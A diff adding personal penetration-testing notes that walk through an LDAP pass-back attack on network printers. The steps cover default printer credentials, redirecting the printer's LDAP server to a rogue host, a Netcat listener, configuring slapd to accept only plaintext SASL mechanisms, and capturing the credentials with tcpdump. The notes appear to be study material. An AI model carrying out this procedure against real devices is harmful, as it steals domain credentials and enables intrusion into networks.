@@ -1,0 +1,72 @@
+LDAP Pass-back:
+
+However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. 
+This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.
+
+LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. 
+This can be, for example, the web interface of a network printer. 
+
+Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. 
+Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. 
+However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. 
+In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. 
+We can intercept this authentication attempt to recover the LDAP credentials.
+
+Performing an LDAP Pass-back:
+    Navigate to http://URL_VICTIM to find the settings page of the printer:
+
+    Using browser inspection, we can also verify that the printer website was at least secure enough to not just send the LDAP password back to the browser:
+
+    So we have the username, but not the password. However, when we press test settings, we can see that an authentication request is made to the domain controller to test the LDAP credentials. 
+    Let's try to exploit this to get the printer to connect to us instead, which would disclose the credentials. 
+    To do this, let's use a simple Netcat listener to test if we can get the printer to connect to us. 
+    Since the default port of LDAP is 389, we can use the following command:
+
+    ->#nc -lvp 389
+
+    The "supportedCapabilitiesresponse" tells us we have a problem. 
+    Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details. 
+    It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support
+
+We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext:
+
+Hosting a Rogue LDAP Server:
+    Kali:
+        ->#sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+        ->#sudo dpkg-reconfigure -p low slapd
+            Configuring Slap == No
+            DNS domain name, you want to provide our target domain  (tesla.sucks)
+            Use this same name for the Organisation name as wel 
+            Provide any Administrator password
+            Select MDB as the LDAP database to use
+
+            Configuring Slap - database is not removed when purged == No
+            Configuring Slap - Move old database files out of the way... == Yes
+
+        Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. 
+        We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods
+            LDAP add ldif file:
+            ->#nano olcSaslSecProps.ldif
+                dn: cn=config
+                replace: olcSaslSecProps
+                olcSaslSecProps: noanonymous,minssf=0,passcred
+            
+                The file has the following properties:
+                olcSaslSecProps: Specifies the SASL security properties
+                noanonymous: Disables mechanisms that support anonymous login
+                minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
+
+            ->#sudo ldapadd -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
+
+        Now we can use the ldif file to patch our LDAP server using the following:
+            ->#sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+
+        We can verify that our rogue LDAP server's configuration has been applied using the following command 
+        (Note: If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):
+            ->#ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+                dn:
+                supportedSASLMechanisms: PLAIN
+                supportedSASLMechanisms: LOGIN
+        
+        Capturing LDAP Credentials:
+            ->#sudo tcpdump -SX -i (Our_Network_Interface_name) tcp port 389
